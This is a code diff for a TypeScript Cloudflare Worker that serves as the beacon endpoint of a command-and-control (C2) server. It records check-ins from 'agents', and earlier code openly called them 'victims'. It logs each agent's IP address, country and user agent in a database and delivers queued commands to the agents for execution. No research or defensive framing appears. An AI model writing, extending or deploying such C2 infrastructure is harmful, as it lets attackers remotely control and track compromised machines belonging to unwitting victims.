@@ -1,11 +1,8 @@
 import { json, error } from "../core/response"
-import { rateLimit } from "../core/rateLimit"
-import { getVictim, upsertVictim } from "../storage/victims"
 import {
   getCommand,
   deleteCommand
 } from "../storage/commands"
-import { Victim } from "../types/victim"
 
 export async function beacon(
   request: Request,
@@ -28,41 +25,46 @@ export async function beacon(
     return error("Invalid agent id", 400)
   }
 
-  // ✅ rate limit (agent-based, proven)
-  const allowed = await rateLimit(
-    env.C2_STORAGE,
-    `agent:${body.id}`
-  )
-
-  if (!allowed) {
-    return error("Too Many Requests", 429)
-  }
-
-  // ---- victim tracking ----
+  const agentId = body.id
   const now = new Date().toISOString()
 
-  const existing = await getVictim(env.C2_STORAGE, body.id)
+  // -----------------------------
+  // 1️⃣ ACTIVE AGENT HEARTBEAT (KV)
+  // -----------------------------
+  // Cheap, TTL-based, no JSON
+  await env.C2_STORAGE.put(
+    `active:${agentId}`,
+    "1",
+    { expirationTtl: 120 } // agent online if beaconed in last 2 mins
+  )
 
-  const victim: Victim = existing ?? {
-    id: body.id,
-    firstSeen: now,
-    lastSeen: now,
-    country: request.headers.get("CF-IPCountry") || "unknown",
-    userAgent: request.headers.get("User-Agent") || "unknown",
-    status: "online"
-  }
+  // -----------------------------
+  // 2️⃣ UPDATE METADATA (D1)
+  // -----------------------------
+  await env.RESULTS_DB.prepare(`
+    INSERT INTO agents (id, first_seen, last_seen, ip, country, user_agent)
+    VALUES (?, ?, ?, ?, ?, ?)
+    ON CONFLICT(id) DO UPDATE SET
+      last_seen = excluded.last_seen,
+      ip = excluded.ip,
+      country = excluded.country,
+      user_agent = excluded.user_agent
+  `).bind(
+    agentId,
+    now,
+    now,
+    request.headers.get("CF-Connecting-IP"),
+    request.headers.get("CF-IPCountry"),
+    request.headers.get("User-Agent")
+  ).run()
 
-  victim.lastSeen = now
-  victim.status = "online"
-
-  await upsertVictim(env.C2_STORAGE, victim)
-
-  // ---- command consumption (STEP 4) ----
-  const cmd = await getCommand(env.C2_STORAGE, body.id)
+  // -----------------------------
+  // 3️⃣ COMMAND DELIVERY (KV)
+  // -----------------------------
+  const cmd = await getCommand(env.C2_STORAGE, agentId)
 
   if (cmd) {
-    // atomic enough for KV (single agent)
-    await deleteCommand(env.C2_STORAGE, body.id)
+    await deleteCommand(env.C2_STORAGE, agentId)
 
     return json({
       command: cmd.command,
@@ -71,7 +73,6 @@ export async function beacon(
     })
   }
 
-  // no command
   return json({
     command: null,
     interval: 60
